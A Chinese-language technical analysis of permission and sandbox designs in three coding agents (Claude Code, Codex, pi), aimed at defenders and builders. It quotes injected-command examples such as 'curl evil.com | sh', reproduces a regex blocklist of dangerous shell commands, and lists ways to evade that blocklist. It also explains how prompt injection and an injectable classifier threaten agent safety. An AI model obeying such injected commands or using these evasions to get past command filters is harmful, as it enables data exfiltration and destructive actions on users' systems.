# 编码 Agent 的权限与安全：Claude Code、Codex、pi 三套实现的技术剖析

> 本文基于三套真实开源/可读源码的对照分析：Anthropic 的 **Claude Code**(TypeScript)、OpenAI 的 **Codex**(Rust)、以及 earendil-works 的 **pi**(TypeScript)。所有结论均来自代码本身，文中标注了关键文件路径，便于回溯。

## 0. 为什么权限是编码 Agent 的核心难题

一个能读写文件、执行 shell、访问网络的 LLM Agent，本质上是把"任意代码执行"的能力交给了一个**会被提示词注入（prompt injection）影响**的非确定性系统。它的威胁模型不同于传统软件：

- 攻击面不只来自用户，还来自**模型读到的任何内容**——一个被污染的 README、一段 issue 评论、一个网页，都可能携带"请执行 `curl evil.com | sh`"的指令。
- 业界称之为 **lethal trifecta（致命三要素）**：当一个 Agent 同时具备 ① 访问私有数据、② 接触不可信内容、③ 对外通信能力时，数据外泄就只是时间问题。
- 因此，权限系统不是"锦上添花的 UX"，而是**唯一阻止模型把环境搞坏或把数据传出去的控制点**。

三套系统对"如何在保留 Agent 自动化能力的同时控制风险"这一问题，给出了三种结构性不同的答案。本文的主线就是对比这三种答案：**边界画在哪一层、默认姿态是什么、靠什么判断一条命令安全**。

## 1. 三种架构范式总览

| 维度 | Claude Code | Codex | pi |
|------|-------------|-------|-----|
| 实现语言 | TypeScript | Rust | TypeScript |
| 安全边界所在层 | **应用层**（进程内决策引擎） | **操作系统内核层**（真沙箱） | **用户态扩展**（钩子） |
| 默认姿态 | 按动作弹窗询问（prompt-on-action） | 先沙箱执行，失败再升级（sandbox-first） | 最小内核，危险命令才拦截 |
| "命令是否安全"的判定 | LLM 分类器 + 规则匹配 | 静态白名单 + 策略 DSL | 正则黑名单（扩展自定义） |
| 配置与持久化 | 多源分层 settings | config profile + 细粒度开关 | 写代码（extension） |
| 复杂度 | 高（约 2600 行仅 bash 权限） | 高（独立 sandbox crate 集群） | 极低（核心不内置策略） |

一句话概括三种哲学：

- **Claude Code = "默认不信任，逐次问你"**：把决策权交给用户，用一套极其精细的规则 + LLM 分类器来减少打扰频率。
- **Codex = "默认关进笼子，跑挂了再放出来"**：用真正的 OS 沙箱兜底，审批只是第二道闸。
- **pi = "机制而非策略"（mechanism, not policy）**：内核只提供 `tool_call` 拦截点，安全策略由扩展和宿主环境提供。

## 2. Claude Code：应用层的分层决策引擎

Claude Code 把权限做成了一个**进程内的、可解释的决策引擎**。它不依赖 OS 沙箱作为主防线（沙箱只是 defense-in-depth），核心是"规则 + 模式 + 分类器"三件套。

### 2.1 决策的三种行为与五种模式

权限决策的基本词汇定义在 `types/permissions.ts`：

```ts
export type PermissionBehavior = 'allow' | 'deny' | 'ask'

export const EXTERNAL_PERMISSION_MODES = [
  'acceptEdits',      // 自动接受文件编辑，其它仍询问
  'bypassPermissions',// 全部放行（危险模式）
  'default',          // 默认逐次询问
  'dontAsk',
  'plan',             // 计划模式：只读，不允许产生副作用
] as const
```

每次工具调用的结果是一个 `PermissionDecision`：`allow` / `ask` / `deny`，外加一个 `passthrough`（交给下一层处理）。关键在于：**每个决策都附带一个 `decisionReason`**，可能是 `rule`（命中某条规则）、`mode`（当前模式决定）、`hook`（被钩子拦截）、`classifier`（LLM 分类器判定）、`safetyCheck`（安全检查）、`sandboxOverride` 等十余种。这让权限系统是**可审计、可解释**的——UI 能准确告诉用户"为什么弹这个框"。

### 2.2 规则的多源分层

权限规则 `PermissionRule` 带有"来源"，且来源之间有优先级：

```ts
export type PermissionRuleSource =
  | 'userSettings'     // ~/.claude 用户级
  | 'projectSettings'  // 项目级（入库共享）
  | 'localSettings'    // 项目本地（不入库）
  | 'flagSettings'
  | 'policySettings'   // 企业策略（最高，不可被覆盖）
  | 'cliArg'
  | 'command'
  | 'session'          // 本次会话临时授权
```

规则本身是 `{ toolName, ruleContent }`。对 bash 命令，`ruleContent` 支持 **prefix / exact / wildcard** 三种匹配（`tools/BashTool/bashPermissions.ts`，单这一个文件约 2600 行，可见 bash 权限的复杂度）。用户在弹窗里点"always allow `npm test`"，就会往某个来源里写入一条 `addRules` 更新。

这套设计的精妙之处在于 **`policySettings` 作为企业不可绕过层**——管理员可以下发一条 deny 规则，无论用户怎么配都无法覆盖。这是企业部署 Agent 时的关键合规能力。

### 2.3 用 LLM 给 shell 命令分级：分类器

Claude Code 最有特色的设计是用一个**独立的 LLM 分类器**来判断 bash 命令的危险性，而不是纯靠正则。`types/permissions.ts` 里的 `YoloClassifierResult` 揭示了它的工程化程度：

```ts
export type YoloClassifierResult = {
  shouldBlock: boolean
  reason: string
  stage?: 'fast' | 'thinking'   // 两阶段：快筛 + 深思
  transcriptTooLong?: boolean   // 上下文超限时确定性失败，回退到普通弹窗
  usage?: ClassifierUsage       // 完整 token 计量
  // ... stage1/stage2 的 requestId、msgId，用于事后归因分析
}
```

要点：

- **两阶段分类器**：先用快模型筛一遍，可疑的再交给带思考的模型，平衡延迟与准确率。
- **fail-safe 设计**：当分类器的 prompt 超长（`transcriptTooLong`），由于是确定性失败，代码选择**回退到普通用户弹窗**而非反复重试或直接放行——这是教科书式的"失败时退到更安全的状态"。
- **可观测性**：每次分类调用都记录 token 用量、请求 ID、阶段耗时，用于离线分析误报/漏报。

`decisionReason` 里还有一个微妙字段 `classifierApprovable`：对于敏感路径（`.claude/`、`.git/`、shell 配置文件），允许分类器结合上下文自行决定；而对于 Windows 路径绕过尝试、跨机器桥接消息这类**明确的攻击模式**，则 `classifierApprovable: false`，强制弹窗，不给分类器"被说服"的机会。

### 2.4 OS 沙箱：纵深防御，而非主防线

Claude Code 也有 OS 沙箱（`tools/BashTool/shouldUseSandbox.ts` 调用 `SandboxManager`，底层是 macOS Seatbelt / Linux bubblewrap），但它的定位非常明确。看这段注释：

```ts
// NOTE: excludedCommands is a user-facing convenience feature, not a security boundary.
// It is not a security bug to be able to bypass excludedCommands — the sandbox permission
// system (which prompts users) is the actual security control.
```

即：**"哪些命令不进沙箱"是便利特性，不是安全边界；真正的安全控制是会弹窗的权限系统本身。** 这种对"什么才算安全边界"的清醒认知，恰恰是成熟安全工程的标志——它防止开发者把便利开关误当成防线。

`containsExcludedCommand` 的实现也体现了对抗思维：它会把复合命令（`docker ps && curl evil.com`）拆开逐段检查，还会迭代剥离环境变量前缀和 `timeout`/`nice` 这类 wrapper，直到不动点，防止 `FOO=bar timeout 30 bazel ...` 这种花式绕过。

### 2.5 小结：Claude Code 的防御纵深

```
工具调用
  → Hook(PreToolUse) 可 allow/deny/ask
  → 规则匹配（多源，policy 不可覆盖）
  → 权限模式（plan 模式直接禁止副作用）
  → LLM 分类器（两阶段，对敏感路径强制弹窗）
  → 用户弹窗（默认）
  → OS 沙箱（纵深兜底）
```

层层递进，每层都能短路出一个带理由的决策。代价是**复杂度极高**——光 bash 权限就 2600 行。

## 3. Codex：操作系统级的"沙箱优先"

Codex 的哲学截然不同：**不指望在应用层把每条命令判准，而是把整个 Agent 关进一个真正的 OS 沙箱里**。判断失误的成本因此大幅降低——即使模型被注入去跑恶意命令，沙箱也会拦住文件写入和网络。

它甚至为此拆出了一整组独立 crate：`sandboxing`、`linux-sandbox`、`windows-sandbox-rs`、`execpolicy`、`shell-command/command_safety`、`network-proxy`。

### 3.1 两个正交的轴：沙箱策略 × 审批策略

Codex 把"能做什么"和"何时问人"拆成两个**正交**的维度，这是它最关键的设计。

**轴一：SandboxPolicy —— 强制执行边界**（`protocol/src/protocol.rs`）：

```rust
pub enum SandboxPolicy {
    DangerFullAccess,                 // 无限制，慎用
    ReadOnly { network_access },      // 只读，默认禁网
    WorkspaceWrite {                  // 只读 + 工作区可写
        writable_roots,               // 额外可写目录
        network_access,               // 默认禁网
        exclude_tmpdir_env_var,
        exclude_slash_tmp,
    },
    ExternalSandbox { network_access },// 已在外部沙箱中
}
```

注意几个安全默认：**网络默认关闭**（`network_access` 默认 `false`），写权限默认只限工作区。这是"最小权限"原则的直接体现。

**轴二：AskForApproval —— 何时升级给人**（`protocol/src/protocol.rs`）：

```rust
pub enum AskForApproval {
    UnlessTrusted,   // 只自动批准"已知安全且只读"的命令，其余都问
    OnFailure,       // (已废弃) 全自动跑沙箱，失败才升级
    OnRequest,       // (默认) 模型自己决定何时请求批准
    Granular(GranularApprovalConfig), // 细粒度：分类别开关
    Never,           // 永不问；失败直接回给模型
}
```

`Granular` 把审批拆成可独立开关的类别，颗粒度细到令人印象深刻：

```rust
pub struct GranularApprovalConfig {
    pub sandbox_approval: bool,    // shell 命令的升级审批
    pub rules: bool,               // execpolicy 规则触发的提示
    pub skill_approval: bool,      // skill 脚本执行
    pub request_permissions: bool, // request_permissions 工具
    pub mcp_elicitations: bool,    // MCP 的 elicitation 提示
}
```

**两轴正交**意味着：你可以"读写工作区 + 永不询问"（CI 场景），也可以"只读 + 凡事都问"（审查不可信仓库），组合空间远比单一开关丰富。

### 3.2 安全判定的三态：AutoApprove / AskUser / Reject

核心决策函数 `assess_patch_safety`（`core/src/safety.rs`）返回：

```rust
pub enum SafetyCheck {
    AutoApprove { sandbox_type, user_explicitly_approved },
    AskUser,
    Reject { reason },
}
```

它的逻辑很能说明 Codex 的思路——以"补丁写文件"为例：

1. 如果写入路径**全部落在可写根目录内** → 倾向自动批准；
2. 但即便如此，**也要在沙箱里执行**，因为路径可能是指向沙箱外的硬链接（注释明确点出了这个攻击向量）；
3. 只有当平台**确实能强制沙箱**时才自动批准（`get_platform_sandbox` 返回 `Some`）；拿不到沙箱就回退到询问用户——**"无法强制 → 不敢自动批准"**；
4. 写到工作区外、且策略不允许沙箱审批 → 直接 `Reject`。

这种"能不能强制决定敢不敢自动"的逻辑，是 Codex 与 Claude Code 的根本差异：**Codex 把信任锚定在 OS 能力上，而非 LLM 判断上。**

### 3.3 "已知安全命令"白名单

与 Claude Code 用 LLM 分类器相反，Codex 用一份**静态、保守的白名单**（`shell-command/src/command_safety/is_safe_command.rs`）来决定哪些命令在 `UnlessTrusted` 模式下可免审批：

```rust
fn is_safe_to_call_with_exec(command: &[String]) -> bool {
    match executable_name_lookup_key(cmd0).as_deref() {
        Some("cat" | "cd" | "cut" | "echo" | "grep" | "head" | "ls" |
             "pwd" | "tail" | "wc" | "which" | "whoami" | ...) => true,
        Some("find") => { /* 但要排除 -exec/-delete/-fprintf 等危险选项 */ }
        Some("base64") => { /* 但要排除 -o/--output 写文件 */ }
        ...
    }
}
```

特征：

- **白名单而非黑名单**——默认不安全，只有明确列出的只读命令才放行。这比黑名单安全得多（黑名单永远列不全）。
- **对参数也要审查**：`find` 在列表里，但带 `-exec`/`-delete` 就不再安全；`base64` 带 `-o` 能写文件也不安全。说明它理解"同一个命令，不同参数风险天差地别"。
- 还支持把 `bash -lc "a && b | c"` 拆成子命令，**当且仅当每个子命令都在白名单里**才整体判安全。

更复杂的策略由 `execpolicy` crate 用一套类 Starlark 的 DSL 表达（`decision.rs` / `policy.rs` / `rule.rs`），可以为特定可执行文件写细粒度规则。

### 3.4 真沙箱的实现

Codex 的沙箱是**真的内核级隔离**，不是进程内检查：

- **macOS**：Seatbelt（`sandbox-exec`），通过 `CODEX_SANDBOX_ENV_VAR=seatbelt` 标记。
- **Linux**：独立的 `linux-sandbox` crate + `bwrap`（bubblewrap），配合 seccomp/landlock。
- **Windows**：`windows-sandbox-rs`，含私有桌面、文件系统覆盖等。
- **网络**：禁网时注入 `CODEX_SANDBOX_NETWORK_DISABLED_ENV_VAR=1`，并有独立的 `network-proxy` crate 做受控出网。

`from_sandbox_exec_request`（`core/src/sandboxing/mod.rs`）负责把沙箱策略翻译成实际的进程参数和环境变量。这意味着**即使权限判断错了，命令也跑在受限进程里**——这是 Codex 敢于"默认更自动化"的底气。

### 3.5 小结：Codex 的"信任但验证"

```
两个正交轴：
  SandboxPolicy（强制边界：只读/工作区可写/全访问，默认禁网）
        ×
  AskForApproval（升级时机：untrusted/onRequest/granular/never）

决策流：
  命令 → 静态白名单/execpolicy → SafetyCheck(三态)
       → 能强制沙箱? → 自动批准(沙箱内执行) / 询问 / 拒绝
       → 沙箱内运行，失败可升级为无沙箱重试
```

核心信念：**把安全锚定在操作系统能力上，而不是任何一次 LLM 或正则判断上。**

## 4. pi：最小内核 + 扩展即策略

pi 走的是 Unix 哲学的极端：**核心不内置任何安全策略，只提供一个拦截点**。所有权限逻辑都由扩展（extension）在用户态实现。

### 4.1 唯一的拦截点：`tool_call` 事件

整个 pi 的内置仓库里几乎搜不到 `permission`/`sandbox` 的核心实现——因为它把这件事外包了。官方示例 `permission-gate.ts` 就是完整的"权限系统"：

```ts
export default function (pi: ExtensionAPI) {
  const dangerousPatterns = [
    /\brm\s+(-rf?|--recursive)/i, /\bsudo\b/i, /\b(chmod|chown)\b.*777/i
  ];

  pi.on("tool_call", async (event, ctx) => {
    if (event.toolName !== "bash") return undefined;
    const command = event.input.command as string;
    const isDangerous = dangerousPatterns.some((p) => p.test(command));

    if (isDangerous) {
      if (!ctx.hasUI) {
        // 非交互模式：默认拦截（fail-closed）
        return { block: true, reason: "Dangerous command blocked (no UI for confirmation)" };
      }
      const choice = await ctx.ui.select(`⚠️ Dangerous command:\n\n  ${command}\n\nAllow?`, ["Yes", "No"]);
      if (choice !== "Yes") return { block: true, reason: "Blocked by user" };
    }
    return undefined; // 放行
  });
}
```

钩子返回 `{ block, reason }` 即可拦截；返回 `undefined` 即放行。`harness/types.ts` 里工具调用结果类型也确认了这个契约：`tool_call: ToolCallResult | undefined`，且结果带可选的 `block?: boolean`。

### 4.2 设计取舍

这套设计的**优点**：

- **极简、可组合**：权限就是一段你能读懂、能改的 30 行代码，没有 2600 行的黑盒。
- **fail-closed 默认正确**：示例里非交互模式（`!ctx.hasUI`）默认拦截危险命令——没有 UI 可确认时，选择拒绝而非放行。这个细节方向是对的。
- **灵活**：你可以接任何策略——调外部 OPA、查 LLM、读公司规则库——只要在钩子里实现。

**代价**与**风险**：

- **安全责任转嫁给扩展作者**。示例用的是**正则黑名单**——而黑名单是出了名的不可靠：`rm -rf` 能匹配，但 `rm  -rf`（多空格示例之外的变体）、`r''m -rf`、`find . -delete`、`python -c "shutil.rmtree(...)"` 全都漏掉。
- **核心不提供 OS 沙箱兜底**（`restore-sandbox-env.ts` 显示它依赖 bun/外部环境提供的沙箱），所以一旦扩展的正则被绕过，**没有第二道防线**。
- 这是典型的"机制 vs 策略"权衡：pi 给了你机制，但**默认配置下的安全强度取决于你写的策略有多好**。

### 4.3 小结：pi 的赌注

```
内核：只暴露 pi.on("tool_call", ...) → 返回 {block, reason} | undefined
策略：完全由扩展提供（示例 = 正则黑名单 + 交互确认）
兜底：依赖宿主/bun 沙箱环境，核心不强制
```

pi 赌的是：**大多数使用者会运行在受控环境里（容器、CI、bun sandbox），且会按需写自己的 gate。** 对会写代码的工程师，这是最大自由度；对开箱即用的安全性，这是最弱保证。

## 5. 横向对比：同一个问题的三种答案

### 5.1 安全边界画在哪一层

```
                  不可信内容/被注入的模型
                          │
   Claude Code ───────────┼─── 应用层决策引擎（规则+分类器+弹窗）
                          │         ↓ 纵深兜底
   Codex ─────────────────┼─── OS 内核沙箱（Seatbelt/bwrap/win）★主防线
                          │
   pi ────────────────────┼─── 用户态扩展钩子（正则/自定义）
                          │         ↓ 依赖
                          └─── 宿主环境沙箱（可选）
```

- **边界越靠下（越接近内核），越难绕过、越通用**——Codex 把主防线放在 OS，理论上最难突破。
- **边界越靠上（越接近应用），越灵活、越可解释**——Claude Code 能给出"为什么拦"的精确理由，能做 plan 模式这种语义级控制，但本质是进程内检查，强度依赖实现正确性。
- **pi 把边界外包**——最灵活也最不设防。

### 5.2 "命令是否安全"的三种判定哲学

| | 机制 | 优点 | 风险 |
|--|------|------|------|
| Claude Code | LLM 分类器（两阶段）+ 规则 | 能理解语义与上下文、误报少、可学习 | 有延迟与成本、非确定性、本身可能被注入 |
| Codex | 静态白名单 + 策略 DSL | 确定性、可审计、零成本 | 列表难穷尽、对新命令保守（多问） |
| pi | 正则黑名单（扩展自定义） | 简单透明 | 黑名单天然不全、易绕过 |

一个深刻的对比：**Claude Code 用"更聪明但不确定"的 LLM 判断，Codex 用"更笨但确定"的白名单。** Codex 的选择背后是一个安全公理——**安全控制本身不应依赖一个会被提示词注入的组件**。Claude Code 用两阶段、强制弹窗敏感路径、fail-safe 回退来缓解这个风险，但没有完全消除它；它的底气来自"分类器只是减少打扰，最终还有用户弹窗 + 沙箱兜底"。

### 5.3 默认姿态与适用场景

- **Claude Code（prompt-on-action）**：适合**交互式开发**，人在回路，重视"每一步都可知可控"。默认偏保守，靠规则积累和分类器把打扰降到可接受。
- **Codex（sandbox-first）**：适合**更高自动化**乃至无人值守，靠真沙箱让"判错的代价"足够低，从而敢把审批调松。两轴正交让它能精确匹配 CI / 审查不可信代码 / 本地全权 等不同场景。
- **pi（minimal core）**：适合**工程师自建管线**，把安全策略当作可编程的一等公民，但要求使用者自己对安全负责，或运行在外部沙箱中。

### 5.4 对 prompt injection / lethal trifecta 的抵御

- **Codex 最强**：默认禁网（切断"对外通信"这一要素）+ 工作区限制写入 + 内核沙箱。即使模型完全被劫持，外泄和破坏都受 OS 约束。
- **Claude Code 中等偏强**：对敏感路径强制弹窗、`classifierApprovable: false` 阻断已知攻击模式、plan 模式可彻底禁副作用；但主防线在应用层，且分类器自身在原则上可被注入影响。
- **pi 最弱（默认）**：正则黑名单挡不住有意构造的注入，核心无禁网/无沙箱兜底——安全性几乎完全取决于部署环境和扩展质量。

## 6. 给"自建编码 Agent"的工程建议

把三套的经验提炼成可落地的原则（也适用于本仓库 `code-agent` 这类项目）：

1. **分清"便利"与"安全边界"。** 学 Claude Code 那句注释：明确写下"哪些机制是便利、哪些是真正的控制点"。不要让一个为方便加的 allowlist 被误当成防线。

2. **安全控制不要依赖会被注入的组件。** 如果用 LLM 判危险命令（如 Claude Code），必须有确定性的兜底（强制弹窗 + 沙箱），并对已知攻击模式禁用"被说服"路径。

3. **能上 OS 沙箱就上，作为最后一道闸。** Codex 证明了：有了真沙箱，应用层判断即使偶尔出错，代价也可控。至少要做到"默认禁网 + 写入限定工作区"——这直接打断 lethal trifecta。

4. **失败要 fail-closed。** pi 在无 UI 时默认拦截、Claude Code 在分类器超限时回退到弹窗——任何不确定的时刻，都退到更安全的状态，而不是放行。

5. **决策要可解释。** Claude Code 的 `decisionReason` 值得抄：每个 allow/deny/ask 都带明确理由，既利于调试，也让用户信任系统。

6. **把"沙箱策略"与"审批策略"解耦。** Codex 的双正交轴是优雅范式——"强制什么"和"何时问人"是两个问题，分开配置能覆盖从交互到无人值守的全谱。

7. **企业场景需要不可覆盖层。** Claude Code 的 `policySettings` 优先级最高且不可被用户配置覆盖——任何要进组织的 Agent 都需要这种管理员强制策略。

## 7. 结语

三套系统其实是在同一道光谱上的三个点：

> **灵活/可解释 ←———————————→ 强隔离/难绕过**
>
> pi（用户态钩子） — Claude Code（应用层引擎） — Codex（内核沙箱）

- **pi** 把权限当作可编程的机制，自由度最大，默认防护最弱。
- **Claude Code** 在应用层做到了极致的精细与可解释，用 LLM 分类器换取"少打扰"，并以沙箱做纵深兜底。
- **Codex** 把信任锚定在操作系统能力上，用"沙箱优先 + 双轴正交"换取在高自动化下依然可控。

没有绝对最优——选择取决于你的威胁模型：**人在回路的交互开发**倾向 Claude Code 式的精细审批；**追求自动化、要跑不可信代码**则倾向 Codex 式的强沙箱；**自建可控管线的工程团队**可能更喜欢 pi 式的极简内核。但三者共享同一个底层共识，也是本文最想强调的一点：

> **永远不要把"唯一的安全控制点"放在一个会被提示词注入影响的组件上——要么用确定性规则，要么用操作系统级的强制隔离，最好两者都有。**
